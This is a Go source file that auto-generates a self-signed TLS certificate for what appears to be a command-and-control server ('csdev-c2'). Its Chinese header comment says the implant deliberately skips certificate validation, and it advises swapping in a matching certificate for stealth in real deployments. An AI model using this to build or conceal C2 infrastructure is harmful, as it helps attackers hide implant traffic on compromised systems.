// csdev :: tls.go  --  服务端 HTTPS (自签名证书自动生成)
//
// 为什么自签名就够用:
//   植入体侧 (WinHTTP) 已经显式忽略未知 CA / CN 不匹配 / 过期 / 用途不符
//   (见 kits/beacon/beacon2.c 的 SECURITY_FLAG_IGNORE_*), 因此证书的**作用**
//   是把流量包进 TLS, 而不是做对端身份验证。真实部署中若要更强的隐蔽性,
//   把 data/server.crt|key 换成匹配命令的证书即可 —— 换掉后植入体无需改动。
package main

import (
	"crypto/rand"
	"crypto/rsa"
	"crypto/sha256"
	"crypto/x509"
	"crypto/x509/pkix"
	"encoding/hex"
	"encoding/pem"
	"fmt"
	"math/big"
	"net"
	"os"
	"path/filepath"
	"time"
)

const (
	tlsCertFile = "server.crt"
	tlsKeyFile  = "server.key"
)

// ensureSelfSignedCert 返回 (证书路径, 私钥路径)。已存在则直接复用。
func ensureSelfSignedCert(dir string) (string, string, error) {
	certPath := filepath.Join(dir, tlsCertFile)
	keyPath := filepath.Join(dir, tlsKeyFile)

	if _, err := os.Stat(certPath); err == nil {
		if _, err := os.Stat(keyPath); err == nil {
			return certPath, keyPath, nil
		}
	}
	if err := os.MkdirAll(dir, 0o755); err != nil {
		return "", "", fmt.Errorf("创建数据目录失败: %w", err)
	}

	priv, err := rsa.GenerateKey(rand.Reader, 2048)
	if err != nil {
		return "", "", fmt.Errorf("生成私钥失败: %w", err)
	}

	serial, err := rand.Int(rand.Reader, new(big.Int).Lsh(big.NewInt(1), 128))
	if err != nil {
		return "", "", fmt.Errorf("生成序列号失败: %w", err)
	}

	tmpl := x509.Certificate{
		SerialNumber: serial,
		Subject: pkix.Name{
			CommonName:   "csdev-c2",
			Organization: []string{"csdev"},
		},
		NotBefore:             time.Now().Add(-24 * time.Hour),
		NotAfter:              time.Now().AddDate(10, 0, 0),
		KeyUsage:              x509.KeyUsageKeyEncipherment | x509.KeyUsageDigitalSignature | x509.KeyUsageCertSign,
		ExtKeyUsage:           []x509.ExtKeyUsage{x509.ExtKeyUsageServerAuth},
		BasicConstraintsValid: true,
		IsCA:                  true,
		DNSNames:              []string{"localhost", "*.local"},
		IPAddresses:           []net.IP{net.ParseIP("127.0.0.1"), net.ParseIP("::1")},
	}

	der, err := x509.CreateCertificate(rand.Reader, &tmpl, &tmpl, &priv.PublicKey, priv)
	if err != nil {
		return "", "", fmt.Errorf("签发证书失败: %w", err)
	}

	certPEM := pem.EncodeToMemory(&pem.Block{Type: "CERTIFICATE", Bytes: der})
	keyPEM := pem.EncodeToMemory(&pem.Block{
		Type:  "RSA PRIVATE KEY",
		Bytes: x509.MarshalPKCS1PrivateKey(priv),
	})

	if err := os.WriteFile(certPath, certPEM, 0o644); err != nil {
		return "", "", fmt.Errorf("写证书失败: %w", err)
	}
	if err := os.WriteFile(keyPath, keyPEM, 0o600); err != nil {
		return "", "", fmt.Errorf("写私钥失败: %w", err)
	}

	// 顺带把证书指纹打出来, 便于人工核对换证后是否生效
	{
		sum := sha256.Sum256(der)
		logf("[*] 已生成自签名 TLS 证书 (10 年有效)")
		logf("    cert : %s", certPath)
		logf("    key  : %s", keyPath)
		logf("    指纹 : %s", hex.EncodeToString(sum[:8]))
	}
	return certPath, keyPath, nil
}
